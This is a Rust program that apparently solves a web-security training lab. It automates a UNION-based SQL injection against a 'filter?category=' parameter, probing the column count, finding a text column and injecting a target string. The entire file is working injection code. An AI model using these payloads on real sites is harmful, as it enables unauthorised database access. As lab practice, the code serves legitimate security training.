use regex::Regex;
use sql_injection::{HTTP_CLIENT, check_is_lab_solved, generate_clap_parser};
use std::{iter::repeat_n, sync::LazyLock};

static EXTRACT_TARGET_STRING_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"Make\sthe\sdatabase\sretrieve\sthe\sstring:\s'(.+?)'")
        .expect("[-] Failed to construct EXTRACT_TARGET_STRING_REGEX")
});

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    logger::info("Fetching the string that is to be queried from the database");

    let response = HTTP_CLIENT
        .get(lab_url)
        .send()
        .expect("[-] Failed to fetch the lab page")
        .text()
        .expect("[-] Failed to extract the body");

    let target_string: &str = EXTRACT_TARGET_STRING_REGEX
        .captures(&response)
        .expect("[-] Failed to find the target string")
        .get(1)
        .expect("[-] Failed to capture the target string")
        .as_str();

    logger::success(format!("String to be queried from database: {}", target_string).as_ref());

    logger::info("Determining the number of columns using UNION SELECT...");

    let mut columns = 1;

    loop {
        let payload = repeat_n("NULL", columns).collect::<Vec<&str>>().join(", ");
        let query = format!("' UNION SELECT {}--", payload);

        logger::info(
            format!(
                "Making query {}: {}/filter?category={}",
                columns, lab_url, query
            )
            .as_ref(),
        );

        if HTTP_CLIENT
            .get(format!("{}/filter?category={}", lab_url, query))
            .send()
            .expect("[-] Failed to make a GET request")
            .status()
            == 200
        {
            break;
        } else {
            columns += 1;
        }
    }

    logger::success(
        format!(
            "The number of columns found using UNION SELECT is {}",
            columns
        )
        .as_ref(),
    );

    logger::info("Finding a column containing text...");

    let mut target_column: usize = 0;

    for i in 0..columns {
        let payload = (0..columns)
            .map(|column| if column == i { "'string'" } else { "NULL" })
            .collect::<Vec<&str>>()
            .join(", ");

        let query = format!("' UNION SELECT {}--", payload);

        logger::info(format!("Making query {}: {}/filter?category={}", i, lab_url, query).as_ref());

        if HTTP_CLIENT
            .get(format!("{}/filter?category={}", lab_url, query))
            .send()
            .expect("[-] ")
            .status()
            == 200
        {
            target_column = i;

            logger::success(
                format!("The column containing text is: {i} (Index starts from 0!)").as_ref(),
            );

            break;
        } else {
            continue;
        }
    }

    logger::info("Querying the target string...");

    let payload = (0..columns)
        .map(|column| {
            if column == target_column {
                format!("'{}'", target_string)
            } else {
                "NULL".to_string()
            }
        })
        .collect::<Vec<String>>()
        .join(", ");

    let query = format!("' UNION SELECT {}--", payload);

    if HTTP_CLIENT
        .get(format!("{}/filter?category={}", lab_url, query))
        .send()
        .expect("[-] Failed to query the target string")
        .status()
        == 200
    {
        logger::success("The string is queried successfully");
    } else {
        logger::error("Failed to query the string");
    }

    check_is_lab_solved(lab_url);
}
